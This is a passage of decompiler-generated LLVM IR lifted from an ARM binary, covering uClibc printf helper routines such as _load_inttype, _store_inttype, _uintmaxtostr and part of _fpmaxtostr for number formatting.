  %v1_14010 = add i32 %v0_1400c, 16
  %v2_14010 = inttoptr i32 %v1_14010 to i32*
  %v3_14010 = load i32, i32* %v2_14010, align 4
  store i32 %v3_14010, i32* %r3.global-to-local, align 4
  %v9_14014 = icmp eq i32 %v3_1400c, %v3_14010
  store i1 %v9_14014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14014, label %dec_label_pc_1401c, label %dec_label_pc_14024

dec_label_pc_1401c:                               ; preds = %dec_label_pc_1400c
  %v1_1401c = and i32 %v3_13fc0, 2
  %v2_1401c = icmp eq i32 %v1_1401c, 0
  store i1 %v2_1401c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1401c, label %dec_label_pc_1403c, label %dec_label_pc_14024

dec_label_pc_14024:                               ; preds = %dec_label_pc_1400c, %dec_label_pc_1401c
  %v1_14024 = and i32 %v4_13fc8, 1024
  %v2_14024 = icmp eq i32 %v1_14024, 0
  store i1 %v2_14024, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_14024, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_14030 = call i32 @__GI_fseek()
  store i32 %v0_14030, i32* %r0.global-to-local, align 4
  %v2_14034 = icmp eq i32 %v0_14030, 0
  store i1 %v2_14034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14034, label %.dec_label_pc_1403c_crit_edge, label %dec_label_pc_13fe0

.dec_label_pc_1403c_crit_edge:                    ; preds = %dec_label_pc_14024
  %v0_1403c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1403c

dec_label_pc_1403c:                               ; preds = %.dec_label_pc_1403c_crit_edge, %dec_label_pc_14004, %dec_label_pc_1401c
  %v2_1404c = phi i32 [ %v0_1403c.pre, %.dec_label_pc_1403c_crit_edge ], [ %v0_1400c, %dec_label_pc_14004 ], [ %v0_1400c, %dec_label_pc_1401c ]
  %v1_1403c = inttoptr i32 %v2_1404c to i32*
  %v2_1403c = load i32, i32* %v1_1403c, align 4
  store i32 %v2_1403c, i32* %r3.global-to-local, align 4
  %v1_14040 = add i32 %v2_1404c, 8
  %v2_14040 = inttoptr i32 %v1_14040 to i32*
  %v3_14040 = load i32, i32* %v2_14040, align 4
  store i32 %v3_14040, i32* %r1.global-to-local, align 4
  %v1_14044 = and i32 %v2_1403c, -4
  store i32 %v1_14044, i32* %r3.global-to-local, align 4
  %v3_14048 = sdiv i32 %v2_1403c, 256
  store i32 %v3_14048, i32* %r2.global-to-local, align 4
  %v1_1404c = trunc i32 %v3_14048 to i8
  %v3_1404c = add i32 %v2_1404c, 1
  %v4_1404c = inttoptr i32 %v3_1404c to i8*
  store i8 %v1_1404c, i8* %v4_1404c, align 1
  %v0_14050 = load i32, i32* %r1.global-to-local, align 4
  %v1_14050 = load i32, i32* @r4, align 4
  %v2_14050 = add i32 %v1_14050, 20
  %v3_14050 = inttoptr i32 %v2_14050 to i32*
  store i32 %v0_14050, i32* %v3_14050, align 4
  %v0_14054 = load i32, i32* %r3.global-to-local, align 4
  %v1_14054 = trunc i32 %v0_14054 to i8
  %v2_14054 = load i32, i32* @r4, align 4
  %v3_14054 = inttoptr i32 %v2_14054 to i8*
  store i8 %v1_14054, i8* %v3_14054, align 1
  %v0_14058 = load i32, i32* %r1.global-to-local, align 4
  %v1_14058 = load i32, i32* @r4, align 4
  %v2_14058 = add i32 %v1_14058, 24
  %v3_14058 = inttoptr i32 %v2_14058 to i32*
  store i32 %v0_14058, i32* %v3_14058, align 4
  %v0_1405c = load i32, i32* %r1.global-to-local, align 4
  %v1_1405c = load i32, i32* @r4, align 4
  %v2_1405c = add i32 %v1_1405c, 16
  %v3_1405c = inttoptr i32 %v2_1405c to i32*
  store i32 %v0_1405c, i32* %v3_1405c, align 4
  %v0_14060.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14060

dec_label_pc_14060:                               ; preds = %dec_label_pc_13ffc, %dec_label_pc_1403c
  %v2_1406c = phi i32 [ %v0_1400c, %dec_label_pc_13ffc ], [ %v0_14060.pre, %dec_label_pc_1403c ]
  %v1_14060 = inttoptr i32 %v2_1406c to i32*
  %v2_14060 = load i32, i32* %v1_14060, align 4
  %v1_14064 = or i32 %v2_14060, 64
  store i32 %v1_14064, i32* %r2.global-to-local, align 4
  %v3_14068 = sdiv i32 %v2_14060, 256
  store i32 %v3_14068, i32* %r3.global-to-local, align 4
  %v1_1406c = trunc i32 %v3_14068 to i8
  %v3_1406c = add i32 %v2_1406c, 1
  %v4_1406c = inttoptr i32 %v3_1406c to i8*
  store i8 %v1_1406c, i8* %v4_1406c, align 1
  %v0_14070 = load i32, i32* @r4, align 4
  %v1_14070 = add i32 %v0_14070, 1
  %v2_14070 = inttoptr i32 %v1_14070 to i8*
  %v3_14070 = load i8, i8* %v2_14070, align 1
  %v4_14070 = zext i8 %v3_14070 to i32
  %v3_14074 = mul nuw nsw i32 %v4_14070, 256
  store i32 %v3_14074, i32* %r3.global-to-local, align 4
  %v1_14078 = and i32 %v3_14074, 2816
  store i32 %v1_14078, i32* %r0.global-to-local, align 4
  %v2_14078 = icmp eq i32 %v1_14078, 0
  store i1 %v2_14078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14078, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_14060
  %v2_1407c = add i32 %v0_14070, 12
  %v3_1407c = inttoptr i32 %v2_1407c to i32*
  %v4_1407c = load i32, i32* %v3_1407c, align 4
  store i32 %v4_1407c, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_14060
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_14084 = load i32, i32* %r2.global-to-local, align 4
  %v1_14084 = trunc i32 %v0_14084 to i8
  %v3_14084 = inttoptr i32 %v0_14070 to i8*
  store i8 %v1_14084, i8* %v3_14084, align 1
  %v0_14088 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14088, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_14088 = load i32, i32* %r3.global-to-local, align 4
  %v2_14088 = load i32, i32* @r4, align 4
  %v3_14088 = add i32 %v2_14088, 28
  %v4_14088 = inttoptr i32 %v3_14088 to i32*
  store i32 %v1_14088, i32* %v4_14088, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_1408c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1408c, i32* @r4, align 4
  %v8_1408c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_1408c

; uselistorder directives
  uselistorder i32 %v3_14074, { 1, 0 }
  uselistorder i32 %v3_14068, { 1, 0 }
  uselistorder i32 %v3_14048, { 1, 0 }
  uselistorder i32 %v2_1404c, { 0, 2, 1 }
  uselistorder i1 %v2_13ffc, { 1, 0 }
  uselistorder i32 %v3_13fe8, { 1, 0 }
  uselistorder i32 %v0_1400c, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_13fb4, { 1, 0 }
  uselistorder i32 %v5_13f98, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_14060, { 1, 0 }
  uselistorder label %dec_label_pc_1403c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14024, { 1, 0 }
  uselistorder label %dec_label_pc_13fd4, { 1, 0 }
  uselistorder label %dec_label_pc_13fc0, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_14090 = load i32, i32* @r2, align 4
  %v1_14090 = icmp slt i32 %v0_14090, 0
  %v0_14094 = load i32, i32* @r0, align 4
  %v1_14098 = and i32 %v0_14094, 2048
  %v2_140cc = icmp eq i32 %v1_14098, 0
  br i1 %v1_14090, label %dec_label_pc_140cc, label %dec_label_pc_140a0

dec_label_pc_140a0:                               ; preds = %entry
  br i1 %v2_140cc, label %dec_label_pc_140a8, label %dec_label_pc_140d4

dec_label_pc_140a8:                               ; preds = %dec_label_pc_140a0
  %v7_140a8 = icmp eq i32 %v0_14094, 256
  %v0_140ac = load i32, i32* @r1, align 4
  %v1_140ac = inttoptr i32 %v0_140ac to i32*
  %v2_140ac = load i32, i32* %v1_140ac, align 4
  %v2_140b0 = urem i32 %v2_140ac, 256
  %v2_140b0.v2_140ac = select i1 %v7_140a8, i32 %v2_140b0, i32 %v2_140ac
  br i1 %v7_140a8, label %.thread, label %dec_label_pc_140b8

dec_label_pc_140b8:                               ; preds = %dec_label_pc_140a8
  %v7_140b8 = icmp eq i32 %v0_14094, 512
  br i1 %v7_140b8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_140b8
  %v4_140c0 = urem i32 %v2_140b0.v2_140ac, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_140b8, %dec_label_pc_140a8, %bb
  %v1_140c8 = phi i32 [ %v2_140ac, %dec_label_pc_140b8 ], [ %v2_140b0, %dec_label_pc_140a8 ], [ %v4_140c0, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_140c8

dec_label_pc_140cc:                               ; preds = %entry
  br i1 %v2_140cc, label %dec_label_pc_140dc, label %dec_label_pc_140d4

dec_label_pc_140d4:                               ; preds = %dec_label_pc_140a0, %dec_label_pc_140cc
  %v0_140d4 = load i32, i32* @r1, align 4
  %v1_140d4 = inttoptr i32 %v0_140d4 to i32*
  %v2_140d4 = load i32, i32* %v1_140d4, align 4
  %v3_140d4 = add i32 %v0_140d4, 4
  %v4_140d4 = inttoptr i32 %v3_140d4 to i32*
  %v5_140d4 = load i32, i32* %v4_140d4, align 4
  store i32 %v5_140d4, i32* @r1, align 4
  ret i32 %v2_140d4

dec_label_pc_140dc:                               ; preds = %dec_label_pc_140cc
  %v7_140dc = icmp eq i32 %v0_14094, 256
  %v0_140e0 = load i32, i32* @r1, align 4
  %v1_140e0 = inttoptr i32 %v0_140e0 to i32*
  %v2_140e0 = load i32, i32* %v1_140e0, align 4
  %v2_140e4 = urem i32 %v2_140e0, 256
  %v2_140e4.v2_140e0 = select i1 %v7_140dc, i32 %v2_140e4, i32 %v2_140e0
  br i1 %v7_140dc, label %.thread2, label %dec_label_pc_140ec

dec_label_pc_140ec:                               ; preds = %dec_label_pc_140dc
  %v7_140ec = icmp eq i32 %v0_14094, 512
  br i1 %v7_140ec, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_140ec
  %v4_140f0 = mul i32 %v2_140e4.v2_140e0, 65536
  %v4_140f4 = sdiv i32 %v4_140f0, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_140ec, %dec_label_pc_140dc, %bb5
  %v0_140f8 = phi i32 [ %v2_140e0, %dec_label_pc_140ec ], [ %v2_140e4, %dec_label_pc_140dc ], [ %v4_140f4, %bb5 ]
  %v3_140f8 = ashr i32 %v0_140f8, 31
  store i32 %v3_140f8, i32* @r1, align 4
  ret i32 %v0_140f8

; uselistorder directives
  uselistorder i32 %v0_140f8, { 1, 0 }
  uselistorder i32 %v2_140e4, { 1, 0 }
  uselistorder i32 %v2_140e0, { 1, 2, 0 }
  uselistorder i32 %v2_140b0, { 1, 0 }
  uselistorder i32 %v2_140ac, { 1, 2, 0 }
  uselistorder i1 %v2_140cc, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_140d4, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_14100 = icmp eq i32 %arg2, 256
  br i1 %v7_14100, label %dec_label_pc_1412c, label %dec_label_pc_14108

dec_label_pc_14108:                               ; preds = %entry
  %v7_14108 = icmp eq i32 %arg2, 2048
  br i1 %v7_14108, label %dec_label_pc_14110, label %dec_label_pc_14118

dec_label_pc_14110:                               ; preds = %dec_label_pc_14108
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_14110 = add i32 %tmp2, 4
  %v6_14110 = inttoptr i32 %v5_14110 to i32*
  store i32 %arg4, i32* %v6_14110, align 4
  ret i32 %tmp2

dec_label_pc_14118:                               ; preds = %dec_label_pc_14108
  %v7_14118 = icmp eq i32 %arg2, 512
  br i1 %v7_14118, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_14118
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_14118
  %v4_1411c = sdiv i32 %arg3, 256
  %v1_14128 = trunc i32 %v4_1411c to i8
  %v4_14128 = add i32 %tmp2, 1
  %v5_14128 = inttoptr i32 %v4_14128 to i8*
  store i8 %v1_14128, i8* %v5_14128, align 1
  br label %dec_label_pc_1412c

dec_label_pc_1412c:                               ; preds = %entry, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1412c, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_14138 = icmp slt i32 %arg4, 0
  %v2_14138 = icmp eq i32 %arg4, 0
  store i1 %v2_14138, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_14138, label %dec_label_pc_14150, label %dec_label_pc_14170

dec_label_pc_14150:                               ; preds = %entry
  %v1_14150 = icmp slt i32 %arg3, 0
  %v2_14150 = icmp eq i32 %arg3, 0
  store i1 %v2_14150, i1* %cpsr_z.global-to-local, align 1
  %v1_14154 = sub i32 0, %arg4
  store i32 %v1_14154, i32* %r7.global-to-local, align 4
  br i1 %v1_14150, label %dec_label_pc_1415c, label %dec_label_pc_14170

dec_label_pc_1415c:                               ; preds = %dec_label_pc_14150
  %v1_14160 = sub i32 0, %arg2
  store i32 %v1_14160, i32* %r5.global-to-local, align 4
  %v2_14160 = icmp eq i32 %arg2, 0
  %v2_14164 = icmp eq i1 %v2_14160, false
  %v5_14164 = sext i1 %v2_14164 to i32
  %v6_14164 = sub i32 %v5_14164, %arg3
  store i32 %v6_14164, i32* %r6.global-to-local, align 4
  %v19_14164 = icmp eq i32 %v6_14164, 0
  store i1 %v19_14164, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14178

dec_label_pc_14170:                               ; preds = %dec_label_pc_14150, %entry
  br label %dec_label_pc_14178

dec_label_pc_14178:                               ; preds = %dec_label_pc_1415c, %dec_label_pc_14170
  %storemerge = phi i8 [ 0, %dec_label_pc_14170 ], [ 1, %dec_label_pc_1415c ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_14180 = load i32, i32* %r7.global-to-local, align 4
  %v2_14188 = udiv i32 -1, %v0_14180
  store i32 %v2_14188, i32* %fp.global-to-local, align 4
  %v2_14198 = urem i32 -1, %v0_14180
  %v1_1419c = add i32 %v2_14198, 1
  store i32 %v1_1419c, i32* %sb.global-to-local, align 4
  %v9_141a0 = icmp eq i32 %v1_1419c, %v0_14180
  store i1 %v9_141a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_141a0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14178
  %v1_141a4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_141a4, i32* %sb.global-to-local, align 4
  %v2_141a8 = add i32 %v2_14188, 1
  store i32 %v2_141a8, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14178, %bb
  %v0_141ac = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_141ac, i32* %sl.global-to-local, align 4
  %v0_141b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_141b0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_141b4

dec_label_pc_141b4thread-pre-split:               ; preds = %bb21
  %v0_141b4.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_141bc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_141b4

dec_label_pc_141b4:                               ; preds = %dec_label_pc_141b4thread-pre-split, %.thread
  %v0_14224 = phi i32 [ %v0_141bc.pre, %dec_label_pc_141b4thread-pre-split ], [ %v0_14180, %.thread ]
  %v0_141d0 = phi i32 [ %v0_141b4.pr, %dec_label_pc_141b4thread-pre-split ], [ %v0_141ac, %.thread ]
  %v2_141b4 = icmp eq i32 %v0_141d0, 0
  store i1 %v2_141b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_141b4, label %dec_label_pc_14220, label %dec_label_pc_141c4

dec_label_pc_141c4:                               ; preds = %dec_label_pc_141b4
  %v2_141c4 = urem i32 %v0_141d0, %v0_14224
  %v2_141d4 = udiv i32 %v0_141d0, %v0_14224
  store i32 %v2_141d4, i32* %sl.global-to-local, align 4
  %v0_141e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_141e4 = urem i32 %v0_141e0, %v0_14224
  %v1_141ec = load i32, i32* %sb.global-to-local, align 4
  %v3_141ec = mul i32 %v1_141ec, %v2_141c4
  %v4_141ec = add i32 %v3_141ec, %v2_141e4
  store i32 %v4_141ec, i32* %r5.global-to-local, align 4
  %v2_141f4 = udiv i32 %v0_141e0, %v0_14224
  %v0_141fc = load i32, i32* %fp.global-to-local, align 4
  %v3_141fc = mul i32 %v0_141fc, %v2_141c4
  %v4_141fc = add i32 %v3_141fc, %v2_141f4
  %v2_14204 = udiv i32 %v4_141ec, %v0_14224
  %v2_1420c = add i32 %v4_141fc, %v2_14204
  br label %dec_label_pc_14240

dec_label_pc_14220:                               ; preds = %dec_label_pc_141b4
  %v0_14220 = load i32, i32* %r6.global-to-local, align 4
  %v2_14238 = udiv i32 %v0_14220, %v0_14224
  br label %dec_label_pc_14240

dec_label_pc_14240:                               ; preds = %dec_label_pc_141c4, %dec_label_pc_14220
  %storemerge24 = phi i32 [ %v2_14238, %dec_label_pc_14220 ], [ %v2_1420c, %dec_label_pc_141c4 ]
  %v0_1425c = phi i32 [ %v2_14238, %dec_label_pc_14220 ], [ %v2_1420c, %dec_label_pc_141c4 ]
  %v1_1425c = phi i32 [ 0, %dec_label_pc_14220 ], [ %v2_141d4, %dec_label_pc_141c4 ]
  %v4_141ec.pn = phi i32 [ %v0_14220, %dec_label_pc_14220 ], [ %v4_141ec, %dec_label_pc_141c4 ]
  store i32 %storemerge24, i32* %r6.global-to-local, align 4
  %v0_14248 = urem i32 %v4_141ec.pn, %v0_14224
  %v3_14240 = load i32, i32* %stack_var_0, align 4
  %v2_14244 = icmp ugt i32 %v0_14248, 8
  %v7_14244 = icmp eq i32 %v0_14248, 9
  store i1 %v7_14244, i1* %cpsr_z.global-to-local, align 1
  %v1_1424c = add i32 %v0_14248, 48
  %v0_14254 = load i32, i32* %r8.global-to-local, align 4
  %v1_14254 = add i32 %v0_14254, -1
  store i32 %v1_14254, i32* %r8.global-to-local, align 4
  %v2_14258 = xor i1 %v7_14244, true
  %v3_14258 = and i1 %v2_14244, %v2_14258
  %extract.t = trunc i32 %v1_1424c to i8
  br i1 %v3_14258, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_14240
  %v2_14248 = add i32 %v3_14240, %v0_14248
  %extract.t8 = trunc i32 %v2_14248 to i8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_14240, %bb20
  %v0_14260.off0 = phi i8 [ %extract.t, %dec_label_pc_14240 ], [ %extract.t8, %bb20 ]
  %v2_1425c = or i32 %v0_1425c, %v1_1425c
  %v4_1425c = icmp eq i32 %v2_1425c, 0
  store i1 %v4_1425c, i1* %cpsr_z.global-to-local, align 1
  %v3_14260 = inttoptr i32 %v1_14254 to i8*
  store i8 %v0_14260.off0, i8* %v3_14260, align 1
  %v0_14264 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14264, label %dec_label_pc_14268, label %dec_label_pc_141b4thread-pre-split

dec_label_pc_14268:                               ; preds = %bb21
  %v2_14268 = load i8, i8* %stack_var_-40, align 1
  %v2_1426c = icmp eq i8 %v2_14268, 0
  store i1 %v2_1426c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1426c, label %dec_label_pc_14268..thread2_crit_edge, label %bb22

dec_label_pc_14268..thread2_crit_edge:            ; preds = %dec_label_pc_14268
  %v0_14278.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb22:                                             ; preds = %dec_label_pc_14268
  %v3_14274 = load i32, i32* %r8.global-to-local, align 4
  %v4_14274 = add i32 %v3_14274, -1
  %v5_14274 = inttoptr i32 %v4_14274 to i8*
  store i8 45, i8* %v5_14274, align 1
  %v6_14274 = load i32, i32* %r8.global-to-local, align 4
  %v7_14274 = add i32 %v6_14274, -1
  store i32 %v7_14274, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14268..thread2_crit_edge, %bb22
  %v0_14278 = phi i32 [ %v0_14278.pre, %dec_label_pc_14268..thread2_crit_edge ], [ %v7_14274, %bb22 ]
  ret i32 %v0_14278

; uselistorder directives
  uselistorder i32 %v0_14248, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14224, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_14240, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_14178, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp183 = bitcast float %tmp to i32
  store i32 %tmp183, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-42 = alloca i8, align 1
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-43 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-78 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14284 = load i32, i32* @r4, align 4
  store i32 %v3_14284, i32* %stack_var_-36, align 4
  %v1_14288 = add i32 %arg4, 8
  %v2_14288 = inttoptr i32 %v1_14288 to i8*
  %v3_14288 = load i8, i8* %v2_14288, align 1
  %v4_14288 = zext i8 %v3_14288 to i32
  store i32 %v4_14288, i32* %sl.global-to-local, align 4
  store i32 %arg4, i32* %stack_var_-200, align 4
  %v1_14294 = or i32 %v4_14288, 32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_14298 = icmp ult i32 %v1_14294, 97
  store i1 %v6_14298, i1* %cpsr_n.global-to-local, align 1
  %v7_14298 = icmp eq i32 %v1_14294, 97
  store i1 %v7_14298, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  store i32 %tmp183, i32* %r6.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_142ac = inttoptr i32 %arg4 to i32*
  %v2_142ac = load i32, i32* %v1_142ac, align 4
  store i32 %v2_142ac, i32* %r1.global-to-local, align 4
  br i1 %v7_14298, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_142b0 = add nuw nsw i32 %v4_14288, 6
  store i32 %v2_142b0, i32* %r3.global-to-local, align 4
  %v2_142b8 = urem i32 %v2_142b0, 256
  store i32 %v2_142b8, i32* %sl.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %v2_142ac, i32* %ip.global-to-local, align 4
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  %v1_142d0 = add i32 %arg4, 12
  %v2_142d0 = inttoptr i32 %v1_142d0 to i32*
  %v3_142d0 = load i32, i32* %v2_142d0, align 4
  store i32 %v3_142d0, i32* %r2.global-to-local, align 4
  %v1_142d4 = add i32 %arg4, 4
  %v2_142d4 = inttoptr i32 %v1_142d4 to i32*
  %v3_142d4 = load i32, i32* %v2_142d4, align 4
  store i32 %v3_142d4, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_142d8 = icmp slt i32 %v2_142ac, 0
  store i1 %v1_142d8, i1* %cpsr_n.global-to-local, align 1
  %v2_142d8 = icmp eq i32 %v2_142ac, 0
  store i1 %v2_142d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_142d8, label %bb223, label %bb224

bb223:                                            ; preds = %.thread
  store i32 6, i32* %ip.global-to-local, align 4
  br label %bb224

bb224:                                            ; preds = %.thread, %bb223
  %v1_14638 = phi i32 [ %v2_142ac, %.thread ], [ 6, %bb223 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_142e4 = and i32 %v3_142d0, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_142e4 = icmp eq i32 %v1_142e4, 0
  store i1 %v2_142e4, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-42, align 1
  br i1 %v2_142e4, label %dec_label_pc_142fc, label %dec_label_pc_14308

dec_label_pc_142fc:                               ; preds = %bb224
  %v1_142fc = urem i32 %v3_142d0, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_142fc = icmp eq i32 %v1_142fc, 0
  store i1 %v2_142fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_142fc, label %dec_label_pc_1430c, label %dec_label_pc_14308

dec_label_pc_14308:                               ; preds = %dec_label_pc_142fc, %bb224
  %storemerge = phi i32 [ 43, %bb224 ], [ 32, %dec_label_pc_142fc ]
  %v0_14308.off0 = phi i8 [ 43, %bb224 ], [ 32, %dec_label_pc_142fc ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_14308.off0, i8* %stack_var_-42, align 1
  br label %dec_label_pc_1430c

dec_label_pc_1430c:                               ; preds = %dec_label_pc_142fc, %dec_label_pc_14308
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %tmp183, i32* %r2.global-to-local, align 4
  %v7_14328 = fcmp ord double %arg2, 0.000000e+00
  %not.v7_14328 = xor i1 %v7_14328, true
  %v9_14328 = sext i1 %not.v7_14328 to i32
  store i32 %v9_14328, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %not.v7_14328, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_14328, i1* %cpsr_z.global-to-local, align 1
